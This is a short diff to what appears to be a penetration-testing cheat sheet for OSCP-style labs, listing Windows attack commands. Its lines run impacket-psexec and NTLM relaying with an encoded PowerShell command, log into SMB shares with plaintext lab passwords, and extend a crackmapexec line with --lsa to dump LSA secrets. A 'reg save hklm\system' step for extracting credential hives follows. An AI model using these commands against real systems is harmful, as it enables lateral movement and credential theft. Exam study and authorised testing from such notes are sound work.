@@ -52,7 +52,7 @@ impacket-psexec test.local/john:password123@10.10.10.1
 impacket-ntlmrelayx --no-http-server -smb2support  -c "powershell -E
 smbclient -L 10.10.121.147 -U OSCP.exam\web_svc --password Diamond1
 smbclient \\\\10.10.121.146\\C$ -U oscp.exam/sql_svc
-crackmapexec <protocol> <target(s)> -u username -p password
+crackmapexec <protocol> <target(s)> -u username -p password --local-auth --lsa
 
 LSA dump manual
 reg save hklm\system SYSTEM
